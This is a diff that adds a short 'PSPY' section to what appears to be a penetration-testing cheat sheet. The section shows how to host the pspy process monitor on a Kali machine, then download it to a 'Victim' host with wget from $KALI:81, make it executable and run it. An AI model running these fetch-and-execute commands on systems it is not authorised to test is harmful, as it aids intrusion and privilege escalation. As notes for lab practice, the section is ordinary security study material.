@@ -51,6 +51,27 @@ pacman -Qe # arch linux
 
 
 
+## PSPY
+
+script that can monitor linux processes without root access
+
+**Kali**
+
+```
+wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32 
+python2 -m SimpleHTTPServer 81
+```
+
+**Victim**
+
+```
+wget http://$KALI:81/pspy32 
+chmod +x pspy32 
+./pspy32 
+```
+
+
+
 
 
 Copy Material from here:
